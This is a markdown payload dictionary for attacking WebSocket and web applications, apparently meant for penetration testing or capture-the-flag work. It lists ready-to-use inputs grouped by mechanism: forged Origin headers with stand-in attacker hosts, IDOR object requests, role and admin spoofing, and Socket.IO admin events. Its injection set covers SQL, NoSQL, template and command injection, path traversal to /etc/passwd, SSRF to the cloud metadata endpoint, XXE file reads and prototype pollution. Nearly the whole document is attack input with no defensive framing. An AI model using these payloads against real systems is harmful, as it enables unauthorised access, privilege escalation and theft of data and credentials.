# Payload dictionary — every named payload, grouped by mechanism

## The Origin/CSWSH payload-set

```
Origin: https://evil.example            the baseline foreign
Origin: null                            the null-origin
Origin: file://                         the file-scheme
Origin: https://target.evil.com         the endswith-bypass
Origin: https://eviltarget.com          the substring-bypass
Origin: https://target.com.evil.com     the suffix-bypass
Origin: https://sub.target.com          the subdomain
Origin: https://targetcom.com           the similar-name
Origin: https://target.attacker.com     the attacker-suffix
(omit Origin)                           the no-origin client
```

## The auth-binding payload-set

```
Cookie: session=<victim>                the cookie-binding
Authorization: Bearer <token>           the bearer
Authorization: Basic <b64>              the basic-auth
?token=<jwt>  ?jwt=<jwt>  ?auth=<x>     the URL-token
?key=<key> ?api_key=<key> ?session=<s>  the URL-key
X-Api-Key: <key>  X-Auth-Token: <t>    the custom-header
{"type":"auth","token":"<x>"}           the first-frame token
40{"token":"<x>"}                       the Socket.IO auth
{"type":"connection_init","payload":{"authToken":"<x>"}}   graphql-ws
CONNECT login:<u> passcode:<p>          the STOMP auth
```

## The object-IDOR payload-set

```json
{"action":"read","id":"<other>"}
{"action":"read","id":"admin"}         {"action":"read","id":1}
{"action":"open","doc":"<other>"}      {"action":"load","document":"<x>"}
{"action":"history","room":"<other>"}  {"action":"conversation","id":"<x>"}
{"action":"get","user_id":<n>}         {"action":"view","account":"<x>"}
{"action":"list","org":"<x>"}          {"action":"export","object":"<x>"}
{"action":"fetch","item":"<x>"}        {"action":"read","id":"me"}
{"action":"read","id":"self"}          {"action":"read","id":"current"}
{"action":"read","id":"0"}             {"action":"read","id":"-1"}
{"action":"read","id":"../admin"}      {"action":"read","id":"*"}
```

## The membership/subscribe payload-set

```json
{"action":"join","room":"admin"}       {"action":"join","channel":"internal"}
{"action":"subscribe","channel":"internal"}
{"action":"subscribe","topic":"/user/<other>/events"}
{"action":"watch","doc":"admin-doc"}   {"action":"listen","topic":"internal"}
{"action":"follow","channel":"private"}{"action":"subscribe","channel":"#"}
```

## The action-dispatch payload-set

```json
{"action":"admin"}   {"action":"debug"}   {"action":"internal"}
{"action":"system"}  {"action":"eval","code":"x"}  {"action":"exec","cmd":"id"}
{"action":"flag"}    {"action":"secret"}  {"action":"config","key":"x"}
{"action":"broadcast","text":"x"}         {"action":"announce","msg":"x"}
{"action":"set_role","role":"admin"}      {"action":"impersonate","user":"admin"}
{"action":"grant","perm":"admin"}         {"action":"reset","user":"admin"}
{"action":"dump"}    {"action":"export"}  {"action":"backup"}
{"action":"metrics"} {"action":"reload"}  {"action":"migrate"}
{"action":"su","user":"root"}             {"action":"login_as","user":"admin"}
{"action":"admin:flag"} {"action":"system.exec"}  {"action":"internal/cmd"}
```

## The Socket.IO event payload-set

```text
42["ping"]
42["admin",{}]
42["debug",{"cmd":"x"}]
42["eval",{"code":"x"}]
42["internal",{...}]
42["system",{"cmd":"flag"}]
42["join",{"room":"secret"}]
42["read",{"id":"victim"}]
42["subscribe",{"channel":"internal"}]
40{"token":"eyJ"}
40/admin
42/admin,["cmd",{"cmd":"flag"}]
```

## The spoof/self-grant payload-set

```json
{"from":"victim","action":"x"}          {"sender":"admin","action":"x"}
{"user_id":2,"action":"x"}              {"user":"admin","action":"x"}
{"action":"x","role":"admin"}           {"action":"x","is_admin":true}
{"action":"x","user":{"role":"admin"}}  {"action":"x","perm":["admin"]}
{"action":"x","debug":true,"internal":true}
{"action":"x","scope":"*","level":9}    {"action":"x","admin":true,"sudo":true}
{"action":"x","__proto__":{"role":"admin"}}
```

## The injection payload-set — the carrier fields

```json
{"action":"search","q":"x' OR '1'='1--"}
{"action":"search","q":"x' UNION SELECT flag,2,3--"}
{"action":"login","user":"admin","pass":{"$ne":null}}
{"action":"read","id":{"$gt":""}}
{"action":"greet","name":"{{7*7}}"}
{"action":"greet","name":"{{config.FLAG}}"}
{"action":"render","tpl":"${7*7}"}
{"action":"ping","host":"x;id"}
{"action":"exec","cmd":"cat /flag"}
{"action":"convert","file":"x|id"}
{"action":"read","file":"../../etc/passwd"}
{"action":"load","path":"/flag"}
{"action":"fetch","url":"http://169.254.169.254/latest/meta-data/"}
{"action":"webhook","url":"http://internal/admin"}
{"action":"parse","xml":"<!DOCTYPE r[<!ENTITY x SYSTEM 'file:///flag'>]><r>&x;</r>"}
{"action":"merge","obj":{"__proto__":{"isAdmin":true}}}
{"action":"import","data":"<serialized>"}
{"action":"x","obj":{"$or":[{"_id":"a"},{"_id":"b"}]}}
```

## The session/resume payload-set

```json
{"session_id":"<old>"}   {"resume":"<old-session>"}  {"reconnect":true}
{"seq":0}                {"offset":0}                {"lastEventId":-1}
{"token":"<forged-jwt>"} {"auth":"<stale-token>"}
```
